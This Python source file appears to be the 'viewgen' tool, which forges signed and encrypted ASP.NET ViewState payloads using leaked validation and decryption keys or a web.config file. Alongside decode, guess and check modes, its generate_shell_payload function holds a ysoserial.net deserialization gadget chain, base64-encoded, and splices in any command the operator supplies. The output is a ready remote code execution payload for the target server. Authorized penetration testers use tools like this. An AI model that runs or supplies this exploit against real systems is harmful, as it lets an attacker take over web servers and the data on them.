#!/usr/bin/env python3

from pprint import pprint
from Crypto.Cipher import AES
from Crypto.Cipher import DES
from Crypto.Cipher import DES3
from viewstate import ViewState
from xml.dom import minidom
from colored import fg, attr

import argparse
import hashlib
import hmac
import base64
import os
import binascii
import struct


pad = lambda s, bs: s + (bs - len(s) % bs) * chr(bs - len(s) % bs).encode("ascii")
unpad = lambda s: s[:-ord(s[len(s)-1:])]


def success(s):
	print("[%s+%s] %s%s%s%s" % (fg("light_green"), attr(0), attr(1), s, attr(21), attr(0)))


def warning(s):
	print("[%s!%s] %s%s%s%s" % (fg("yellow"), attr(0), attr(1), s, attr(21), attr(0)))


class ViewGen:
	MD5_MODIFIER = b"\x00"*4
	MODIFIER_SIZE = 4
	hash_algs = {"SHA1": hashlib.sha1, "MD5": hashlib.md5, "SHA256": hashlib.sha256, "SHA384": hashlib.sha384, "SHA512": hashlib.sha512, "AES": hashlib.sha1, "3DES": hashlib.sha1}
	hash_sizes = {"SHA1": 20, "MD5": 16, "SHA256": 32, "SHA384": 48, "SHA512": 64, "AES": 20, "3DES": 20}

	def __init__(self, validation_key=None, validation_alg=None, dec_key=None, dec_alg=None, modifier=None, encrypted=False):
		self.validation_key = validation_key
		self.dec_key = dec_key
		self._init_validation_alg(validation_alg)
		self._init_dec_alg(dec_alg)
		self.encrypted = encrypted
		if modifier is None:
			self.modifier = ViewGen.MD5_MODIFIER
		else:
			self.modifier = struct.pack("<I", int(modifier, 16))
		self._reuse_iv = False
		self._iv = None
		self._random_bytes = None

	def encode(self, payload, reuse_iv=False):
		self._reuse_iv = reuse_iv
		if self.encrypted:
			return self.encrypt_and_sign(payload)
		return self.sign(payload)

	def decode(self, payload, parse=False):
		if self.encrypted:
			payload, signature = self.decrypt(payload)
			try:
				vs = ViewState(payload)
			except:
				print(f"[!] Invalid formatting. Decrypted ViewState printed below in Base64:\n{payload}")
				return None, None
		else:
			vs = ViewState(payload)
			try:
				vs.decode()
				signature = vs.signature
				if self.validation_alg is None:
					self.validation_alg = vs.mac
				payload = base64.b64encode(base64.b64decode(payload)[:-self._get_hash_size()])
			except:
				return None, None

		if parse:
			return vs.decode(), signature

		return payload, signature

	def encrypt(self, data):
		iv = self._iv
		random_bytes = self._random_bytes

		if self.dec_alg == "AES":
			if not self._reuse_iv:
				iv = self._gen_random_bytes(AES.block_size)
				random_bytes = self._gen_random_bytes(AES.block_size)
			cipher = AES.new(self.dec_key, AES.MODE_CBC, iv)
			payload = pad(random_bytes + data + self.modifier, AES.block_size)
		elif self.dec_alg == "DES":
			if not self._reuse_iv:
				iv = self._gen_random_bytes(DES.block_size)
			cipher = DES.new(self.dec_key[:8], DES.MODE_CBC, iv)
			payload = pad(data + self.modifier, DES.block_size)
		elif self.dec_alg == "3DES":
			if not self._reuse_iv:
				iv = self._gen_random_bytes(DES3.block_size)
			cipher = DES3.new(self.dec_key[:24], DES3.MODE_CBC, iv)
			payload = pad(data + self.modifier, DES3.block_size)
		else:
			return None

		return cipher.encrypt(payload), iv

	def decrypt(self, payload):
		data = base64.b64decode(payload)
		hash_size = self._get_hash_size()
		if self.dec_alg == "AES":
			iv = data[0:AES.block_size]
			enc = data[AES.block_size:-hash_size]
			cipher = AES.new(self.dec_key, AES.MODE_CBC, iv)
			block_size = AES.block_size
			random_bytes_size = block_size
		elif self.dec_alg == "DES":
			iv = data[0:DES.block_size]
			enc = data[DES.block_size:-hash_size]
			cipher = DES.new(self.dec_key[:8], DES.MODE_CBC, iv)
			random_bytes_size = 0
		elif self.dec_alg == "3DES":
			iv = data[0:DES3.block_size]
			enc = data[DES3.block_size:-hash_size]
			cipher = DES3.new(self.dec_key[:24], DES3.MODE_CBC, iv)
			random_bytes_size = 0
		else:
			return None

		dec = cipher.decrypt(enc)
		signature = data[-hash_size:]
		unpad_dec = unpad(dec)
		self._random_bytes = unpad_dec[:random_bytes_size]
		self._iv = iv
		modifier = unpad_dec[-ViewGen.MODIFIER_SIZE:]
		idx = ViewGen.MODIFIER_SIZE
		if self._double_signature:
			idx += 20

		return base64.b64encode(unpad_dec[random_bytes_size:-idx]), signature

	def encrypt_and_sign(self, payload):
		if self._double_signature:
			payload = self.sign(payload)

		data = base64.b64decode(payload)
		enc, iv = self.encrypt(data)

		if "MD5" in self.validation_alg:
			h = hashlib.md5(iv + enc + self.validation_key)
		else:
			hash_alg = self._get_hash_alg()
			if hash_alg:
				h = hmac.new(self.validation_key, iv + enc, hash_alg)
			else:
				return None

		return base64.b64encode(iv + enc + h.digest())

	def sign(self, payload):
		data = base64.b64decode(payload)

		if "MD5" in self.validation_alg:
			h = hashlib.md5(data + self.validation_key + ViewGen.MD5_MODIFIER)
		else:
			hash_alg = self._get_hash_alg()
			if hash_alg:
				h = hmac.new(self.validation_key, data + self.modifier, hash_alg)
			else:
				return base64.b64encode(data)

		return base64.b64encode(data + h.digest())

	@staticmethod
	def guess_algorithms(payload):
		payload_size = len(base64.b64decode(payload))
		candidates = []
		for hash_alg in ViewGen.hash_sizes.keys():
			hash_size = ViewGen.hash_sizes[hash_alg]
			if (payload_size - hash_size) % AES.block_size == 0:
				candidates.append(("AES", hash_alg))
			if (payload_size - hash_size) % DES.block_size == 0:
				candidates.append(("DES/3DES", hash_alg))
		return candidates

	@staticmethod
	def _gen_random_bytes(n):
		return os.urandom(n)

	def _init_dec_alg(self, dec_alg):
		self.dec_alg = dec_alg.upper()
		if "AUTO" in self.dec_alg:
			if len(self.dec_key) == 8:
				self.dec_alg = "DES"
			else:
				self.dec_alg = "AES"
		if self.dec_alg == "3DES":
			if len(self.dec_key) == 8:
				self.dec_alg = "DES"

	def _init_validation_alg(self, validation_alg):
		self.validation_alg = validation_alg.upper()
		self._double_signature = False
		if "AES" in self.validation_alg or "3DES" in self.validation_alg:
			self._double_signature = True

	def _get_hash_size(self):
		return self._search_dict(ViewGen.hash_sizes, self.validation_alg)

	def _get_hash_alg(self):
		return self._search_dict(ViewGen.hash_algs, self.validation_alg)

	@staticmethod
	def _search_dict(d, query):
		items = [value for key, value in d.items() if query in key.upper()]
		if not items:
			return None
		return items[0]


def generate_shell_payload(command):
	# Generated with: https://github.com/pwntester/ysoserial.net
	ysoserial_net_shell_payload = "/wEy7REAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAADy9jIHBpbmcgOC44LjguOAYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL"
	return base64.b64encode(base64.b64decode(ysoserial_net_shell_payload).replace(b"\x0f/c ping 8.8.8.8", bytes("%s%s%s" % (chr(len(command)+3), "/c ", command), "utf-8")))


def read_webconfig(webconfig_path):
	document = minidom.parse(webconfig_path)
	machine_key = document.getElementsByTagName("machineKey")[0]
	vkey = machine_key.getAttribute("validationKey")
	valg = machine_key.getAttribute("validation").upper()
	dkey = machine_key.getAttribute("decryptionKey")
	dalg = machine_key.getAttribute("decryption").upper()
	encrypted = False

	for subelement in document.getElementsByTagName("pages"):
		if subelement.getAttribute("viewStateEncryptionMode") == "Always":
			encrypted = True

	if valg == "AES" or valg == "3DES":
		encrypted = True

	return vkey, valg, dkey, dalg, encrypted


def parse_args():
	parser = argparse.ArgumentParser(description="viewgen is a ViewState tool capable of generating both signed and encrypted payloads with leaked validation keys or web.config files")
	parser.add_argument("--webconfig", help="automatically load keys and algorithms from a web.config file", required=False)
	parser.add_argument("-m", "--modifier", help="VIEWSTATEGENERATOR value", required=False, default="00000000")
	parser.add_argument("-c", "--command", help="command to execute", required=False)
	parser.add_argument("--decode", help="decode a ViewState payload", required=False, default=False, action="store_true")
	parser.add_argument("--decrypt", help="print decrypted ViewState payload (don't try to decode)", required=False, default=False, action="store_true")
	parser.add_argument("--guess", help="guess signature and encryption mode for a given payload", required=False, default=False, action="store_true")
	parser.add_argument("--check", help="check if modifier and keys are correct for a given payload", required=False, default=False, action="store_true")
	parser.add_argument("--vkey", help="validation key", required=False, default="")
	parser.add_argument("--valg", help="validation algorithm", required=False, default="")
	parser.add_argument("--dkey", help="decryption key", required=False, default="")
	parser.add_argument("--dalg", help="decryption algorithm", required=False, default="")
	parser.add_argument("-e", "--encrypted", help="ViewState is encrypted", required=False, default=False, action="store_true")
	parser.add_argument("payload", help="ViewState payload (base 64 encoded)", nargs="?")
	args = parser.parse_args()

	if args.webconfig:
		args.vkey, args.valg, args.dkey, args.dalg, args.encrypted = read_webconfig(args.webconfig)

	return args


def run_viewgen(args):
	if args.payload is None and args.command is None:
		warning("The following arguments are required: payload")
		exit(1)

	generate = not args.decode and not args.check and not args.guess

	if generate or args.check:
		if not args.vkey or not args.valg or not args.dkey or not args.dalg:
			warning("Please provide validation/decryption keys and algorithms or a valid web.config")
			exit(1)

	viewgen = ViewGen(binascii.unhexlify(args.vkey), args.valg, binascii.unhexlify(args.dkey), args.dalg, args.modifier, args.encrypted)

	# New option from @ramen0x3f
	if args.decrypt:
		viewstate = viewgen.decrypt(args.payload)[0].decode('ascii')
		if viewstate is not None:
			print(f"Decrypted ViewState (decode with Base64): {viewstate}")

	if args.decode:
		viewstate, signature = viewgen.decode(args.payload, parse=True)
		success("ViewState")
		pprint(viewstate)
		if signature is not None:
			success("Signature: %s" % str(binascii.hexlify(signature), "utf-8"))

	if args.check:
		viewstate, sa = viewgen.decode(args.payload)
		encoded = viewgen.encode(viewstate, reuse_iv=True)
		viewstate, sb = viewgen.decode(encoded)

		if sa == sb:
			success("Signature match")
		else:
			warning("Signature fail")

	if args.guess:
		viewstate, signature = viewgen.decode(args.payload)
		if viewstate is None:
			warning("ViewState is encrypted")
			candidates = viewgen.guess_algorithms(args.payload)
			success("Algorithm candidates:")
			for candidate in candidates:
				print("%s %s" % (candidate[0], candidate[1].upper()))
		else:
			if viewgen.encrypted:
				success("ViewState has been decrypted")
			else:
				success("ViewState is not encrypted")
			if signature is None:
				success("ViewState is not signed")
			else:
				hash_alg = list(viewgen.hash_sizes.keys())[list(viewgen.hash_sizes.values()).index(len(signature))]
				success("Signature algorithm: %s" % hash_alg.upper())

	if generate:
		if args.command is None:
			result = viewgen.encode(args.payload)
		else:
			result = viewgen.encode(generate_shell_payload(args.command))
		print(str(result, "utf-8"))


if __name__ == "__main__":
	args = parse_args()
	run_viewgen(args)
